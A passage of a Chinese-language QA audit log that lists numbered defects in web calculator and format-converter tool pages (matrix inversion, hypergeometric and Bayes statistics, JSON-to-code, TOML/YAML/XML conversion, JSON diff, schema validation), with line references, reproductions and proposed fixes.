- 问题：页面中文说明写「输入数字或罗马串即可立即互转」，但 `#number`、`#roman` 无 `oninput`，`#dir` 无 `onchange`，脚本只在加载时调用一次 `calcTool()`，之后仅按钮触发。
- 证据：`tools/it/roman-numeral-converter.html:99`（承诺）、`:114`、`:118`、`:122`（三个控件均无事件）、`:232`（仅首屏调用）、`:126`（计算按钮）
- 复现：把数字框从 1984 改成 2024、或把方向切到「罗马 → 数字」并输入 `MMXXIV` → 结果区仍停留在旧值 `1984 = MCMLXXXIV`，直到点「计算」才更新；期望输入/切换方向即刷新。
- 影响：首屏与用户操作不同步，切换方向后展示的是另一方向的旧结果，容易被当成转换错误。
- 方案：给三个控件加 `oninput`/`onchange="calcTool()"`，并保留按钮作为显式触发。

### IT-N370 逆矩阵主元用绝对阈值 `1e-12`，合法小量级矩阵被判「奇异」（中，确认缺陷）
- 问题：Gauss-Jordan 选主元后以 `Math.abs(pivot) < 1e-12` 判奇异，阈值是绝对值而非相对量；对角元为 `1e-13` 的可逆矩阵因此直接报错。
- 证据：`tools/it/matrix-inverter.html:292-301`（主元阈值）、`:272-274`（`fmt` 也按 1e-12 抹零）
- 复现（node 复刻）：`[[1e-13,0],[0,1e-13]]`，det = 1e-26 ≠ 0，逆矩阵应为 `[[1e13,0],[0,1e13]]` → 实际输出「矩阵不可逆（奇异）」；期望正常求逆（或提示「矩阵接近奇异，结果可能不稳定」而非判死）。
- 影响：以极小单位（如米/纳米、概率密度）录入的对角矩阵被误判不可逆，得到完全相反的结论。
- 方案：阈值改为相对判据，如 `abs(pivot) < 1e-12 * max(1, maxAbs(A))`，或在归一化前先按行做尺度缩放（equilibration）。

### IT-N371 4×4 默认矩阵只有两个对角元为 1，选中即必然「奇异」（中，确认缺陷）
- 问题：`build()` 的默认值表达式只覆盖 `i===0`、`i===n+1`，附加的 `i===8` 又限定 `n===3`；4×4 时只填 `a0`、`a5`，后两行全 0，行列式为 0。
- 证据：`tools/it/matrix-inverter.html:254-257`（默认值生成）、`:166-170`（尺寸选择含 4×4）、`:317-323`（计算即报错）
- 复现：选「4 × 4」→ 实际矩阵 `[[1,0,0,0],[0,1,0,0],[0,0,0,0],[0,0,0,0]]`，det=0 → 点「计算逆矩阵」必得「矩阵不可逆（奇异矩阵）」；期望默认单位阵（`a10`、`a15` 也为 1）。
- 影响：选择受支持的 4×4 后，用户必须先手工填满 16 格才能得到任何结果，首屏默认状态直接报错，属于功能默认值缺陷。
- 方案：默认值改为 `i % (n+1) === 0 ? 1 : 0`（n=2/3/4 均恰好命中主对角线 0、n+1、…、n²−1）。

### IT-N372 N=1 时超几何方差 0/0 得 NaN，卡片显示「未定义」（中，确认缺陷）
- 问题：校验只要求 `N ≥ 1`，但方差公式含有限总体校正因子 `(N−n)/(N−1)`；`N=1` 时该因子为 `0/0`，`0 * NaN` 得 NaN，`fmt` 把 NaN 显示成「未定义」。数学上 N=1、n=1 时 X 恒为 K，方差应为 0。
- 证据：`tools/it/hypergeometric-distribution.html:294`（N 只校验 ≥1）、`:304-305`（方差/标准差）、`:313`（方差卡片）、`:267`（`fmt` 把非有限值显示「未定义」）
- 复现（node 复刻）：N=1, K=1, n=1, k=1 → P(X=1)=1 正确，但方差 = NaN → 卡片「未定义」、标准差「未定义」；期望方差 0、标准差 0（或明确提示 N=1 无法做有限总体校正）。
- 影响：唯一合法的最小总体输入给出 NaN 指标，用户看到「未定义」而非真实值 0，指标自相矛盾。
- 方案：`N===1` 时方差直接取 0（`n===N` 时 `N−n=0` 亦为 0），并把校正因子整体加 `N>1` 守卫。

### IT-N373 分步计算用 `Math.exp(logComb())` 还原组合数，大样本溢出成「未定义」并与主结果矛盾（中，确认缺陷）
- 问题：主概率在 log 空间计算（正确），但步骤 1–4 用 `Math.round(Math.exp(logComb(...)))` 还原组合数；当组合数超过 `Number.MAX_VALUE`（约 `C(10000,5000)`）时 `exp` 得 Infinity，`fmt` 显示「未定义」，步骤 4 出现「未定义 × 未定义 / 未定义 = 0.0159…」。
- 证据：`tools/it/hypergeometric-distribution.html:317-320`（步骤 1–4）、`:271-278`（`logComb`）、`:267-269`（`fmt`）
- 复现（node 复刻）：N=10000, K=5000, n=5000, k=2500 → 实际 P(X=k)=0.01595649（正确），但步骤 1/2/3 全为「未定义」，步骤 4 写成「未定义 × 未定义 / 未定义 = 0.0159…」；期望组合数以指数形式给出（如 `e^6926.64`）或直接展示对数，步骤 4 用 log 形式 `exp(ΣlnC − lnC)`。
- 影响：主结果与推导过程自相矛盾，用户无法核对；大总体（如 1 万件抽检）必然触发。
- 方案：步骤中不还原组合数，改为输出 `ln C(N,n)`，并注明 `P = exp(lnC1+lnC2−lnC3)`；如需展示数值，用 `toExponential()` 保留双精度可表示范围或直接写「约 e^6926.6」。

### IT-N374 先验为 100% 时优势比本应为 ∞，页面显示「未定义」（中，确认缺陷）
- 问题：`priorOdds = prior/(1−prior)`，`prior=1` 时分母 0 得 Infinity；`posteriorOdds = priorOdds*BF` 同样为 Infinity，`fmt` 把 Infinity 统一显示「未定义」。但后验概率本身是确定的 1，∞ 与「未定义」语义完全不同。
- 证据：`tools/it/bayes-theorem.html:171`（prior 允许 0–1，含 1）、`:286-295`（优势比计算）、`:304-305`（卡片）、`:312`（步骤 5）、`:272-274`（`fmt`）
- 复现（node 复刻）：prior=1, likelihood=0.9, falsePositive=0.05 → 实际后验 1（正确），但「贝叶斯因子 BF=18」正常、「优势比变化 未定义 → 未定义」、「先验优势 = 未定义；后验优势 = 未定义」；期望显示「∞（先验绝对确定）」。
- 影响：合法边界输入下两个统计量显示为「未定义」，与「先验 100% 时证据无法再改变信念」的正确解释相反。
- 方案：`prior===1`（或 `prior===0`）时单独分支，优势比/后验优势显示 `∞`，并在步骤 5 加说明「先验为 0/1 时优势比发散」；或把输入范围改为 `0 ≤ p < 1`。

### IT-N375 承诺「知三求一 / 计算所需样本量」，实际只有功效一个输出（中，确认缺陷）
- 问题：公式说明写「计算统计检验的功效或所需样本量」、要点写「四要素……知三可求其一」、英文简介写 "required sample size"，但页面输入只有 d/n/α/检验方向，`calculate()` 只算 power，没有任何反解 n（或反解 d/α）的模式与输出。
- 证据：`tools/it/statistical-power.html:157`（formula-desc）、`:160`（知三可求其一）、`:166-176`（仅 4 个输入）、`:298-331`（只输出 power/β）、`:504`（英文简介）
- 复现：想求「d=0.5、α=0.05、双侧、power=0.8 所需每组样本量」→ 页面无该输入/无该输出，只能反复试 n；期望提供「求样本量」模式，输出 `n = 2((z_{1−α/2}+z_{1−β})/d)²` 并向上取整。
- 影响：核心承诺（样本量规划）缺失，用户按文案操作找不到入口，只能手算。
- 方案：增加「求解目标」选择（求功效 / 求样本量），求样本量时改用 power 输入并按上式反解，同时保留现有功效计算。

### IT-N376 置信区间：`+value || 1` 使 n=0/空值静默变成 1，校验形同虚设（中，确认缺陷）
- 问题：`const n = +document.getElementById('n').value || 1;`、`mean || 0`、`std || 0`；`n=0` 或空值被 `|| 1` 兜成 1，`if(n < 1 …)` 永远拦不住。选 z 分布时还会输出一个看起来完全正常的区间。
- 证据：`tools/it/confidence-interval.html:348-357`（取值与校验）、`:165`（n 输入）、`:360-368`（计算与展示）
- 复现（node 复刻）：mean=50, s=8, n=0, 95%, dist=z → 实际 `[34.320, 65.680]`、标签「z 分布 · 临界值=1.960」（把 0 样本当成 n=1）；dist=auto → 临界值 NaN，区间显示 `[ — , — ]`；期望两者都提示「输入无效」。
- 影响：非法样本量被静默替换成 1，给出可信外观的错误区间；空 mean 也被静默当 0。
- 方案：去掉 `||` 兜底，改用 `Number(...)` 后显式 `isNaN` 判断：`mean/std/n` 任一为空或非有限 → 提示无效；仅在用户留空 mean 且有单独说明时才允许 0。

### IT-N377 t 临界值在 df 6–9 等区间跨档线性内插，误差最大约 +2.9%（中，确认缺陷）
- 问题：`T_TABLE` 只有 df 1/2/3/4/5/10/15/…，`getTCritical` 在相邻两档之间对 t 值做线性内插；df=6–9（n=7–10，小样本最常用区间）跨 5→10 档，插值结果系统性偏大。正确做法通常是在 `1/df` 上内插或补全表项。
- 证据：`tools/it/confidence-interval.html:310-324`（表缺 6–9）、`:326-346`（插值）、`:158`（自称「按 t 表最近自由度线性内插」）
- 复现（node 复刻）：n=7（df=6）→ 实际临界值 2.5024，精确 t(6,0.025)=2.4469（+2.3%），区间 `[42.433, 57.567]`，期望 `[42.600, 57.400]`；df=7 → 2.4338 vs 2.3646（+2.9%）；df=9 → 2.2966 vs 2.2622（+1.5%）。
- 影响：n∈[7,10] 的置信区间被系统性算宽约 1.5–3%，与页面「t 表最近自由度线性内插」的精度预期不符。
- 方案：补全 df 6/7/8/9（及 11–14、16–19 等常用档），或改为对 `1/df` 插值；df>120 再走 z 近似。

### IT-N378 误差范围：N=n（全查）时跳过有限修正仍报 ±3.10%，N<n 被静默当作无限总体（中，确认缺陷）
- 问题：有限总体修正只在 `N > n` 时套用；`N === n` 时校正因子应为 `√(0/(N−1))=0`（全查无抽样误差），但代码跳过修正直接返回无限总体结果；`N < n`（抽样数大于总体，逻辑上不可能）被静默忽略，同样按无限总体输出。另 `parseInt(NStr)` 会把 `1e6` 读成 1。
- 证据：`tools/it/margin-of-error.html:298-308`（计算与 `N>n` 条件）、`:310`（结果用 `Efin`）、`:324`（步骤 4 仅在 applied 时出现）、`:177`（N 输入无 min/step）
- 复现（node 复刻）：n=1000, p=0.5, 95%, N=1000 → 实际 E=±3.099%（CI `[0.4690, 0.5310]`），期望 E=0（全查）；N=800（< n）→ 实际同上 ±3.099%，期望提示「N 必须 ≥ n」；N 填 `1e6` → `parseInt` 得 1，修正被静默跳过（本例数值差异小，但语义已错）。
- 影响：全查被算成有 3.1% 抽样误差；不可能的抽样方案被当成合法输入，得到看似正常的伪结果。
- 方案：`N` 有值时先校验 `N ≥ n`（否则提示错误），再无条件套用 `√(max(0,(N−n)/(N−1)))`（`N===n` 自然得 0）；`N` 改用 `parseFloat` 或 `Number` 并校验整数/有限。

### 覆盖清单（T 批 IT 第 4 轮）
- `text-similarity`：IT-N366（高）、IT-N367（中）。
- `roman-numeral-converter`：IT-N368、IT-N369（中）。
- `matrix-inverter`：IT-N370、IT-N371（中）。
- `hypergeometric-distribution`：IT-N372、IT-N373（中）。
- `bayes-theorem`：IT-N374（中）。
- `statistical-power`：IT-N375（中）。
- `confidence-interval`：IT-N376、IT-N377（中）。
- `margin-of-error`：IT-N378（中）。
- 方法声明：本轮仅基于上述 8 页源码通读 + `node` 在 `/tmp` 复刻页面原函数实算（每条均给出「输入 → 实际 / 期望」），**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在审计日志追加本节。
- 备注（未编号）：`roman-numeral-converter.html:124` 存在未闭合的 `</div`（缺 `>`），解析时会被当作带属性的结束标签，`toolbar` 容器可能被吞为属性，属结构性瑕疵；因未开浏览器确认实际 DOM，暂不单列缺陷。

## U 批 · IT 转换/编码边界（2026-11-04）

### IT-N379 TypeScript 生成器只引用嵌套类型名，从不生成对应 interface/type，默认输入即不可编译（高，确认缺陷）
- 页面：`tools/it/json-to-code.html`
- 问题：`toTS` 只对根对象生成一个 `interface Root`；对象字段经 `tsType` 返回 `capitalize(k)` 的裸类型名（`:319`、`:333-335`），数组对象字段返回 `<Name>Item[]`，但全函数没有任何递归生成子类型的语句。默认示例 `loadSample()` 含 `user:{...}` 与 `orders:[{...}]`，首屏输出即引用不存在的 `User`、`OrdersItem`。
- 行号：`:308-323`（toTS）、`:319`、`:333-335`
- 复现（node 复刻默认示例）：实际输出
  `export interface Root { readonly user: User; readonly orders: OrdersItem[]; ... }`，整份输出没有 `interface User` / `interface OrdersItem`；`tsc` 报 `Cannot find name 'User'`。期望同时生成嵌套 `interface User`、`interface OrdersItem`（或内联对象类型）。
- 影响：TypeScript 选项在默认数据下产出的代码 100% 无法编译，用户必须手工补类型。
- 方案：与 Go 的 `collect*Subs` 同构，增加 `collectTSSubs` 递归输出子 interface，并让字段类型引用同一套命名。
- 假工具：否

### IT-N380 数组对象字段的类型名少一个 `Item` 后缀，Go/C#/Java/Kotlin/Rust/Python 六种输出均编译失败（高，确认缺陷）
- 页面：`tools/it/json-to-code.html`
- 问题：字段类型由 `*Type(v, capitalize(name)+capitalize(k))` 计算，数组会返回 `[]RootOrders` / `List<RootOrders>` / `Vec<RootOrders>`；但递归收集子类型时统一用 `subName + 'Item'` 定义成 `RootOrdersItem`。引用名与定义名不一致。
- 行号：`:342`+`:375` vs `:357`（Go）；`:385`+`:417` vs `:399`（C#）；`:426`+`:460` vs `:442`（Java）；`:471`+`:503` vs `:485`（Kotlin）；`:512`+`:544` vs `:526`（Rust）；`:555`+`:586` vs `:568`（Python）
- 复现（node 复刻）：输入 `{"orders":[{"id":1}]}` → Go 实际 `Orders []RootOrders` + `type RootOrdersItem struct {...}`；期望字段类型 `[]RootOrdersItem` 或子类型名 `RootOrders`，二者一致。C#/Java/Kotlin/Rust/Python 同理（如 Python `List[RootOrders]` vs `class RootOrdersItem`）。
- 影响：六种语言的数组对象输出全部报「未定义类型」，是默认示例（`orders`）即可触发的核心路径。
- 方案：子类型定义与字段引用统一用同一命名函数，数组元素类型不要在命名层再加 `Item`。
- 假工具：否

### IT-N381 Go 子结构体重复 `package main`、Proto 重复 `syntax`，单文件多片段无法编译（高，确认缺陷）
- 页面：`tools/it/json-to-code.html`
- 问题：`toGo` 每个子结构体都从 `package main` 重新开头（`:340`），默认示例含 `address`/`orders` 时同一份输出出现多个 `package` 声明；`toProto` 每个嵌套 message 也从 `syntax = "proto3";` 重新开头（`:593`、`:610`），同一 `.proto` 文件重复 `syntax` 属语法错误。
- 行号：`:340`、`:348`（拼接 subs）、`:593`、`:610`
- 复现（node 复刻）：默认示例切 Go → 输出含两段 `package main`；切 Proto → 输出含两段 `syntax = "proto3";`。期望子结构体/嵌套 message 只输出类型体，文件头只出现一次。
- 影响：只要 JSON 有任意嵌套对象或对象数组，Go/Proto 选项即不可编译，与实际「一键生成可用代码」的定位冲突。
- 方案：把文件头（`package`/`syntax`/imports）拆到顶层生成函数，子类型生成只返回类型声明。
- 假工具：否

### IT-N382 根节点为数组 / 标量 / null 时，非 TS 生成器产出非法字段名或直接抛异常（中，确认缺陷）
- 页面：`tools/it/json-to-code.html`
- 问题：Go/C#/Java/Kotlin/Rust/Python 生成器一律 `Object.entries(obj)`；数组根被当成以 `0`、`1` 为键的对象，`null` 根则 `Object.entries(null)` 直接 TypeError。`convert()` 仅捕获 `JSON.parse`，生成阶段无 try，异常后结果区保持上一次内容。
- 行号：`:283-300`（convert 无生成期 try）、`:341`、`:383`、`:425`、`:469`、`:511`、`:552`
- 复现：输入 `[{"a":1}]` 切 Go → 实际 `type Root struct { 0 Root0 ... }`（字段名 `0` 非法）；输入 `null` 切 Go → 抛 `Cannot convert undefined or null to object`，结果区仍显示旧结果。期望根数组生成类型别名/切片类型，null 给出明确提示。
- 影响：合法 JSON 根形态导致输出不可用或页面静默保留旧结果，用户会误以为已生成成功。
- 方案：生成器入口先判根类型；数组根走 `type Root []RootItem`，标量根走类型别名，null 明确报错；`convert()` 包裹生成调用并渲染错误。
- 假工具：否

### IT-N383 Python 输出使用 `Any` 但只 import 了 `List, Optional`，类定义即 NameError（中，确认缺陷）
- 页面：`tools/it/json-to-code.html`
- 问题：`toPython` 头部固定 `from typing import List, Optional`（`:551`），而 `pyType` 对 null 字段返回 `Optional[Any] = None`、空数组返回 `List[Any] = []`（`:578`、`:585`）。`Any` 未导入，pydantic 在类体求值注解时抛 `NameError: name 'Any' is not defined`。
- 行号：`:551`、`:578`、`:585`
- 复现（node 复刻）：输入 `{"tags":[],"note":null}` 切 Python → 实际生成 `tags: List[Any] = []`、`note: Optional[Any] = None`，文件只有 `import List, Optional`；运行报 NameError。期望导入 `Any`（`from typing import Any, List, Optional`）。
- 影响：含空数组或 null 的 JSON（常见）在 Python 选项下生成的模型无法 import。
- 方案：补齐 `Any` 导入；或空数组改用 `List[object] = []`、null 字段改用 `Optional[object] = None`。
- 假工具：否

### IT-N384 承诺「键名按目标语言惯例转换（camelCase / snake_case）」，实际只做首字母大写（中，承诺未实现）
- 页面：`tools/it/json-to-code.html`
- 问题：参考表明确写「convert keys to target naming conventions」（`:259`），但代码只有 `capitalize()`（首字母大写），TS/Go 等字段名原样保留 `snake_case`/`kebab-case`，不转 camelCase，也未做 `my-key` 之类非法标识符处理。
- 行号：`:259`、`:319`、`:335`、`:342`
- 复现：输入 `{"user_name":1,"api-key":"x"}` 切 TS → 实际 `user_name: number;`（`api-key` 甚至不是合法 TS 字段名），期望 `userName: number;`、`apiKey: string;`（或加引号）。
- 影响：输出风格与文档承诺不符，`kebab-case` 键直接产生语法错误。
- 方案：按目标语言实现命名转换（TS/Java/Kotlin `camelCase`、Go/Python `PascalCase`/`snake_case`），非法标识符加引号或改写。
- 假工具：否（承诺未实现；建议并入 `plan/fake-tools.md`）

### IT-N385 TOML 值解析不支持内联表 / 字面量字符串 / 数字下划线，合法输入被降级成字符串（高，确认缺陷）
- 页面：`tools/it/toml-to-json.html`
- 问题：`tVal` 只处理双引号串、布尔、空串、整数/小数、`[]` 数组，其余原样返回字符串；没有内联表 `{}` 分支、单引号 literal string 分支，整数正则 `^-?\d+$` 也不接受 `_`。但页面注意事项明确写「字符串、整数、浮点、布尔、数组、内联表都会被正确解析」（`:173`）。
- 行号：`:232-240`（tVal）、`:173`（承诺）
- 复现（node 复刻）：
  `point = { x = 1, y = 2 }` → 实际 `{"point":"{ x = 1, y = 2 }"}`，期望 `{"point":{"x":1,"y":2}}`；
  `a = 1_000` → 实际 `"1_000"`，期望 `1000`；`c = 'lit'` → 实际 `"'lit'"`，期望 `"lit"`。
- 影响：Cargo/pyproject 等常见 TOML 写法（内联表、下划线数字）转换后类型全错，下游 JSON 消费者拿到字符串。
- 方案：补内联表递归解析、单引号 literal string、数字去下划线/支持十六进制；解析失败时明确报错而非静默降级。
- 假工具：否（承诺未实现；建议并入 `plan/fake-tools.md`）

### IT-N386 数组按逗号硬切且逐行解析，引号内逗号/嵌套数组/多行数组全部出错（中，确认缺陷）
- 页面：`tools/it/toml-to-json.html`
- 问题：`tVal` 对数组直接 `inner.split(',')`（`:239`），不识别引号与嵌套层级；`parseToml` 逐行处理（`:250-273`），`ports = [` 当行即被解析为空数组，后续数字行无 `=` 被跳过，结尾 `]` 行还会创建空键。
- 行号：`:239`、`:248-273`
- 复现（node 复刻）：
  `list = ["a,b", "c"]` → 实际 `{"list":["\"a","b\"","c"]}`，期望 `{"list":["a,b","c"]}`；
  `ports = [\n  8000,\n  8001\n]` → 实际 `{"ports":[]}`（8000/8001 丢失），期望 `{"ports":[8000,8001]}`。
- 影响：多行数组是 pyproject.toml 等文件的常见写法，转换后配置项直接丢失。
- 方案：数组改为跨行累积 + 按字符状态机切分（识别引号/括号层级），或整体引入成熟 TOML parser。
- 假工具：否

### IT-N387 「Tab 缩进」输出的是字面反斜杠加 t，不是制表符（中，确认缺陷）
- 页面：`tools/it/toml-to-json.html`
- 问题：`JSON.stringify` 的 space 参数在三元里写成 `'\\t'`（源码中的转义字符串，实际值为两个字符 `\` + `t`），不是 `'\t'`；选择 Tab 后每级缩进都是字面 `\t`。
- 行号：`:301`（另见说明 `:107` 承诺「缩进取 tab」）
- 复现（node 复刻）：`a=1`/`[b] c=2`，indent=tab → 实际字符串 `"{\n\\t\"a\": 1, ...}"`（显示为 `\t` 文本）；期望 `"{\n\t\"a\": 1, ...}"`（真正的 0x09）。
- 影响：复制到编辑器后缩进变成可见的 `\t` 字符，JSON 仍可解析但格式错误。
- 方案：改为 `'\t'`（单反斜杠）。
- 假工具：否

### IT-N388 YAML 流式数组 `[a, b, c]` 未解析，按字符串输出，与对照表示例相反（高，承诺未实现）
- 页面：`tools/it/yaml-to-toml.html`
- 问题：`yScalar` 只处理引号、布尔、null、整数、小数，其余一律返回原字符串（`:218-226`），没有 `[` 分支；参考表却明确给出 `[a, b, c]` → `arr = ["a", "b", "c"]`（`:176`）。
- 行号：`:218-226`、`:265`、`:176`
- 复现（node 复刻）：输入 `arr: [a, b, c]` → 实际 `arr = "[a, b, c]"`（单个字符串）；期望 `arr = ["a", "b", "c"]`。
- 影响：YAML 流式序列（GitHub Actions、docker-compose 常见）全部退化为字符串，TOML 语义错误。
- 方案：在 `yScalar` 增加 `[...]`（及 `{...}` 流式映射）解析，或复用页面已有的 `tVal` 数组逻辑。
- 假工具：否（承诺未实现；建议并入 `plan/fake-tools.md`）

### IT-N389 YAML 行内注释未剥离，注释被写进值字符串（中，确认缺陷）
- 页面：`tools/it/yaml-to-toml.html`
- 问题：`yScalar` 直接对整段 `val` 求值（`:265`），不剥离 `# ...`；`port: 8080 # 端口` 的注释被当成值的一部分。
- 行号：`:218-226`、`:265`
- 复现（node 复刻）：输入 `port: 8080 # 端口` → 实际 `port = "8080 # 端口"`（字符串）；期望 `port = 8080`。
- 影响：带注释的配置项全部变成含注释文本的字符串，数值/布尔语义丢失。
- 方案：解析前按「引号外首个 `#`」截断（与 TOML 侧 `stripComment` 同口径）。
- 假工具：否

### IT-N390 表数组内嵌套对象/子表缺父前缀，输出 `[meta]` 而非 `[items.meta]`（中，确认缺陷）
- 页面：`tools/it/yaml-to-toml.html`
- 问题：`dumpTable` 处理数组表时 `out += '[[k]]' + dumpTable(v[a], sort)`（`:368`），递归调用未传 `prefix`，元素内的嵌套对象被当成根级表；同理元素内的子数组表也会落到根级。
- 行号：`:368`、`:370-371`
- 复现（node 复刻）：输入
  `items:\n  - name: a\n    meta:\n      x: 1` → 实际
  `[[items]]` / `name = "a"` / `[meta]` / `x = 1`；期望 `[items.meta]`。回读后 `meta` 变成独立根表，`items` 元素里没有 `meta`。
- 影响：TOML 结构错位，配置回读语义与 YAML 原文不一致。
- 方案：数组表递归传入 `prefix ? prefix+'.'+k : k`，元素内子表/子数组表都带父前缀。
- 假工具：否

### IT-N391 三页「缩进」下拉均未被读取；toml-to-xml 的「按键名排序」也未接线（中，承诺未实现）
- 页面：`tools/it/yaml-to-toml.html`、`tools/it/toml-to-xml.html`、`tools/it/xml-to-toml.html`
- 问题：三页都提供「缩进：2 空格 / 4 空格 / Tab」，但 JS 从不读取该值——yaml 侧算出 `pad` 后 `dumpToml` 根本不用（且比较写成字面量 `'indent'==='tab'`，永远 false），toml-to-xml 与 xml-to-toml 只读排序复选框；toml-to-xml 的 `top_1`（「按键名排序输出」）在 `calcTool` 中也从未读取，`jsonToXml(obj)` 只传对象。
- 行号：yaml `:117`、`:382`；toml-to-xml `:128`、`:132`、`:362`；xml-to-toml `:127`、`:362-363`
- 复现：三页分别把缩进切到 4 空格 / Tab → 输出与 2 空格完全一致（toml-to-xml 输出恒为单行无缩进 XML）；toml-to-xml 勾选「按键名排序」前后输出顺序不变。期望控件生效，或删除无效控件。
- 影响：界面承诺与实际输出不符，用户会误以为格式已按选择调整。
- 方案：实现 XML pretty-print 与排序开关（排序传入 `ser` 的键遍历），TOML 侧若不需要缩进则删除该下拉。
- 假工具：否（承诺未实现；建议并入 `plan/fake-tools.md`）

### IT-N392 TOML 键名直接当 XML 元素名，含空格/数字开头的键产出非法 XML（中，确认缺陷）
- 页面：`tools/it/toml-to-xml.html`
- 问题：`ser` 用 `'<'+name+...` 原样拼接键名（`:348`、`:351`），不做 XML Name 合法性转换；页面注意事项却写「XML 元素名不能以数字开头或含空格，非法名称需做转换」（`:115`）。
- 行号：`:340-355`（`ser`）、`:348`、`:351`、`:115`
- 复现：输入 `[cfg]\n"user name" = "x"` → 实际 `<cfg><user name>x</user name></cfg>`；输入 `"123" = "y"` → `<123>y</123>`。两者都不是 well-formed XML，期望转成 `<user_name>` / `<_123>`（或明确报错）。
- 影响：TOML 允许带引号的任意键，导出后 XML 解析器直接报错。
- 方案：实现 XML Name 清洗（非法字符转 `_`、数字开头加前缀、冲突去重），或对非法键报错。
- 假工具：否

### IT-N393 `#text` 原样拼接未转义、空数组整键丢失，导出的 XML 非法/不完整（中，确认缺陷）
- 页面：`tools/it/toml-to-xml.html`
- 问题：`ser` 对 `#text` 走 `inner += val[k]`（`:345`），不经过 `escXml`；数组分支对内层数组遍历，空数组时循环 0 次，键被整体省略（`:346`）。
- 行号：`:343-346`
- 复现：输入 `[cfg]\n"#text" = "<b>&</b>"` → 实际 `<cfg><b>&</b></cfg>`（未转义，XML 非法）；期望文本为 `&lt;b&gt;&amp;&lt;/b&gt;`。输入 `[cfg]\nports = []` → 实际 `<cfg></cfg>`（`ports` 键消失），期望 `<ports></ports>` 或明确标注空数组。
- 影响：含 `#text`/空数组的 TOML 导出后要么解析失败，要么丢失字段。
- 方案：`#text` 走 `escXml`；空数组输出 `<k></k>`（或保留空元素）。
- 假工具：否

### IT-N394 XML 实体不解码，`&amp;` 等原样写进 TOML 值（中，确认缺陷）
- 页面：`tools/it/xml-to-toml.html`
- 问题：属性正则直接取引号内原文（`:231-232`），文本节点也只做 `trim()`（`:242`、`:254-257`），全文没有 `&amp;`/`&lt;`/`&#xNN;` 解码；XML 语义上的 `Tom & Jerry` 被写成 `Tom &amp; Jerry`。
- 行号：`:231-232`、`:242`、`:254-257`
- 复现：输入 `<name>Tom &amp; Jerry</name>` → 实际 TOML `name = "Tom &amp; Jerry"`；期望 `name = "Tom & Jerry"`。属性 `<a url="x&amp;y"/>` 同样保留实体。
- 影响：所有含转义字符的 XML 文本/属性在 TOML 中被双重转义，回读值错误。
- 方案：解析后对文本与属性统一做实体解码（至少 `&amp; &lt; &gt; &quot; &apos;` 与数字实体）。
- 假工具：否

### IT-N395 嵌套表内的同名兄弟元素生成 `[[item]]` 而非 `[[config.item]]`（中，确认缺陷）
- 页面：`tools/it/xml-to-toml.html`
- 问题：`dumpTable` 的数组表分支固定写 `'[['+tKey(k)+']]'`（`:348`），忽略 `prefix`；`[config]` 表内的 `item` 数组被提升为根级表数组。
- 行号：`:340-353`（`dumpTable`）、`:348`
- 复现：输入 `<config><item><a>1</a></item><item><a>2</a></item></config>` → 实际
  `[config]` 空表 + `[[item]]` ×2；期望 `[[config.item]]` ×2。TOML 回读后 `config` 下没有 `item`。
- 影响：XML 的嵌套重复元素（RSS、pom、配置文件常见）转换后层级错位。
- 方案：数组表头同样拼接 `prefix`（`[[` + (prefix?prefix+'.':'') + key + `]]`）。
- 假工具：否

### IT-N396 「对比模式」下拉从未被读取，深度/简单两种模式输出完全相同（中，承诺未实现）
- 页面：`tools/it/json-diff.html`
- 问题：`<select id="diffMode">` 提供「深度对比 / 简单对比」并在 `onchange` 调 `doDiff()`（`:201-203`），但 `doDiff`（`:532-594`）从未读取 `diffMode`，始终执行 `deepDiff` + 同一套逐行 diff 与统计。
- 行号：`:201-203`、`:532-594`（无 `diffMode` 引用）
- 复现：同一组输入分别选「深度对比」「简单对比」→ 实际差异列表、统计、行差异、JSON 视图逐字节相同；期望两种模式输出不同（例如简单模式只做逐行比较），否则应删除该控件。
- 影响：用户按模式选择得到的其实是同一结果，容易被误读为「两种算法结论一致」。
- 方案：接入 `diffMode`（simple 走行级 diff 且不做语义展开），或移除该下拉。
- 假工具：否（承诺未实现；建议并入 `plan/fake-tools.md`）

### IT-N397 数组只按索引对齐，「按内容匹配」未实现，FAQ 还引用了不存在的「键匹配模式」（中，承诺未实现）
- 页面：`tools/it/json-diff.html`
- 问题：`deepDiff` 的数组分支固定逐索引比较（`:418-430`）；说明区写「可按索引对齐，也可按内容做匹配」（`:184`），FAQ 写「语义比较需开启键匹配模式」（`:292`），但页面没有任何模式开关或内容匹配实现。
- 行号：`:418-430`、`:184`、`:292`
- 复现：左 `{"tags":["a","b"]}`、右 `{"tags":["b","a"]}` → 实际报 `tags[0]`、`tags[1]` 两处「修改」；期望按内容匹配得到「无差异 / 仅顺序变化」。对象数组换序同样被报成逐项修改。
- 影响：元素顺序调整（后端返回顺序不稳定）被误报成大量字段修改，差异噪声大。
- 方案：实现按内容（或按 key 字段）匹配的数组比对，或在文案中删除该承诺。
- 假工具：否（承诺未实现；建议并入 `plan/fake-tools.md`）

### IT-N398 schema 根缺少 `type:"object"` 时 required/properties/additionalProperties 全部被跳过，非法数据被判通过（高，确认缺陷）
- 页面：`tools/it/json-schema-validator.html`
- 问题：`walk` 只有在 `schema.type === 'object'` 时才检查 required/properties/additionalProperties（`:267-289`）；根 schema 未显式写 `type:"object"`（JSON Schema 中很常见，且 `properties` 本身即隐含对象约束）时，`typeOK(undefined)` 返回 true，随后两个分支都不进入，直接返回无错误。
- 行号：`:260-299`（`:267`、`:272-288`）、`:249`
- 复现：schema `{"required":["a"],"properties":{"a":{"type":"string"}}}` + data `{"a":1}` → 实际「校验通过 ✅」；期望「未通过：类型不匹配 root.a: 期望 string」。data `{}` 时同样漏报必填。
- 影响：大量真实 schema 省略根 `type`，本工具会对明显非法的数据给出「通过」，比报错更危险。
- 方案：`properties`/`required`/`additionalProperties` 存在时按对象处理（或先推断类型），不要依赖显式 `type`。
- 假工具：否

### IT-N399 合法数据 `null` 被当作「JSON 格式错误」，`{"type":"null"}` 永远无法通过（中，确认缺陷）
- 页面：`tools/it/json-schema-validator.html`
- 问题：`parseSafely` 解析失败返回 `null`，而 `JSON.parse('null')` 也返回 `null`，`validateJSON` 用 `data === null` 统一判为格式错误（`:304`）；因此 null 既是合法 JSON 又被误判。
- 行号：`:240-246`、`:304`
- 复现：schema `{"type":"null"}` + data `null` → 实际「JSON 格式错误」；期望「校验通过 ✅」（该 schema 的唯一合法值就是 null）。
- 影响：JSON Schema 的 `null` 类型分支完全不可用，含 null 的可空字段数据也无法校验。
- 方案：解析结果用 `{ok, value}` 包装区分「解析失败」与「值为 null」。
- 假工具：否

